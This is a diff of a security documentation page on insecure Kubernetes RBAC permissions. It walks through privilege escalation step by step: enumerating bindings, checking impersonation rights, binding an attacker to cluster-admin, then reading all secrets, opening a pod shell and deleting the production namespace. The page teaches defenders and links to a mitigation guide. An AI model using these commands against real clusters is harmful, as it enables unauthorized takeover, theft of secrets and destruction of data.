@@ -6,37 +6,39 @@ description: "How overly permissive Kubernetes RBAC configurations enable privil
 
 # Insecure RBAC Permissions
 
-Kubernetes uses **Role-Based Access Control (RBAC)** to manage who can perform which actions on which resources. When RBAC is misconfigured—especially with **wildcard permissions**, **cluster-wide bindings**, or **unscoped roles**—an attacker can gain unauthorized access or escalate privileges to compromise the cluster.
+Kubernetes uses **Role-Based Access Control (RBAC)** to define who can perform what actions on which resources. When RBAC policies are **misconfigured**—especially with wildcard permissions or broad cluster role bindings—attackers can **escalate privileges**, impersonate users, and gain full control over the cluster.
 
 ---
 
-## Exploitation Steps: Privilege Escalation via RBAC
+## Exploitation Steps
 
-An attacker leverages excessive RBAC permissions to escalate privileges and gain administrative control over the cluster.
+### 1. List RBAC Roles and Bindings
 
-### Step 1: Identify RBAC Roles and Bindings
-
-The attacker inspects roles, cluster roles, and their bindings using a compromised pod or low-privileged user account:
+The attacker uses a compromised pod or user account to list all RBAC roles, bindings, and cluster-wide permissions:
 
 ```bash
 kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
 ```
 
-They search for any role or binding that includes excessive permissions or wildcards (`*`).
+They inspect the output for excessive permissions, wildcard access, or sensitive bindings.
 
-### Step 2: Check Impersonation Privileges
+---
 
-The attacker tests if they can impersonate other users—especially administrators:
+### 2. Check Impersonation Rights
+
+The attacker checks whether they are allowed to impersonate a high-privileged user like `admin`:
 
 ```bash
 kubectl auth can-i '*' '*' --as=admin
 ```
 
-If the response is `yes`, they can act as an admin user.
+If the result is `yes`, the attacker can assume admin-level access.
 
-### Step 3: Bind to Cluster Admin Role
+---
 
-If the attacker has permission to bind roles, they can bind themselves to the powerful `cluster-admin` role:
+### 3. Create a ClusterRoleBinding
+
+If allowed to bind roles, the attacker binds themselves to the powerful `cluster-admin` role:
 
 ```bash
 kubectl create clusterrolebinding attacker-admin \
@@ -44,7 +46,7 @@ kubectl create clusterrolebinding attacker-admin \
   --user=attacker
 ```
 
-Alternatively, they may discover an existing binding like this:
+Or by applying a crafted binding file:
 
 ```yaml
 apiVersion: rbac.authorization.k8s.io/v1
@@ -61,15 +63,17 @@ roleRef:
   apiGroup: rbac.authorization.k8s.io
 ```
 
-Apply it using:
+Apply it:
 
 ```bash
 kubectl apply -f pwned-cluster-admin.yaml
 ```
 
-### Step 4: Gain Full Access
+---
 
-With `cluster-admin` privileges, the attacker can now:
+### 4. Execute Arbitrary Commands
+
+Now acting as a `cluster-admin`, the attacker has unrestricted access:
 
 ```bash
 kubectl get secrets -A
@@ -77,12 +81,16 @@ kubectl exec -it <pod-name> -- /bin/sh
 kubectl delete namespace production
 ```
 
-They effectively control the entire cluster.
+They can read secrets, modify workloads, and delete critical resources across all namespaces.
 
 ---
 
-## Summary
+### Result
 
-RBAC misconfigurations—such as **wildcard permissions**, **unscoped bindings**, and **overly privileged roles**—can be exploited by attackers to gain full administrative access to Kubernetes clusters. These mistakes are often present in development or poorly hardened environments, making RBAC a prime target for lateral movement and privilege escalation.
+The attacker has **full administrative control** over the cluster. They can exfiltrate data, delete services, pivot to other environments, or install persistent backdoors.
+
+---
+
+## Mitigation
 
 ➡ [See Mitigation Guide for Insecure RBAC Permissions](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation)
